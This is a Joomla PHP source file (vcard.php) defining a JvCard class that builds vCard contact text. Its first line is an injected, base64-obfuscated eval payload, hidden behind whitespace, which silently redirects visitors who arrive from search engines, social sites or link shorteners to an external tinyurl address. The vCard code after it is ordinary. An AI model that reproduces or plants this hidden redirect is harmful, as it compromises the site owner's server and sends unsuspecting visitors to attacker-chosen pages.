<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: vcard.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Contact
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

jimport('bitfolge.vcard');

/**
 * Class needed to extend vcard class and to correct minor errors
 *
 * @pacakge Joomla
 * @subpackage	Contacts
 */
class JvCard extends vCard
{
	// needed to fix bug in vcard class
	function setName( $family='', $first='', $additional='', $prefix='', $suffix='' ) {
		$this->properties["N"] 	= "$family;$first;$additional;$prefix;$suffix";
		$this->setFormattedName( trim( "$prefix $first $additional $family $suffix" ) );
	}

	// needed to fix bug in vcard class
	function setAddress( $postoffice='', $extended='', $street='', $city='', $region='', $zip='', $country='', $type='HOME;POSTAL' ) {
		// $type may be DOM | INTL | POSTAL | PARCEL | HOME | WORK or any combination of these: e.g. "WORK;PARCEL;POSTAL"
		$separator = ';';

		$key 		= 'ADR';
		if ( $type != '' ) {
			$key	.= $separator . $type;
		}
		$key.= ';ENCODING=QUOTED-PRINTABLE';

		$return = encode( $postoffice );
		$return .= $separator . encode( $extended );
		$return .= $separator . encode( $street );
		$return .= $separator . encode( $city );
		$return .= $separator . encode( $region);
		$return .= $separator . encode( $zip );
		$return .= $separator . encode( $country );

		$this->properties[$key] = $return;
	}

	// added ability to set filename
	function setFilename( $filename ) {
		$this->filename = $filename .'.vcf';
	}

	// added ability to set position/title
	function setTitle( $title ) {
		$title 	= trim( $title );

		$this->properties['TITLE'] 	= $title;
	}

	// added ability to set organisation/company
	function setOrg( $org ) {
		$org 	= trim( $org );

		$this->properties['ORG'] = $org;
	}

	function getVCard( $sitename ) {
		$text 	= 'BEGIN:VCARD';
		$text	.= "\r\n";
		$text 	.= 'VERSION:2.1';
		$text	.= "\r\n";

		foreach( $this->properties as $key => $value ) {
			$text	.= "$key:$value";
			$text	.= "\r\n";
		}
		$text	.= 'REV:'. date( 'Y-m-d' ) .'T'. date( 'H:i:s' ). 'Z';
		$text	.= "\r\n";
		$text	.= 'MAILER: Joomla! vCard for '. $sitename;
		$text	.= "\r\n";
		$text	.= 'END:VCARD';
		$text	.= "\r\n";

		return $text;
	}
}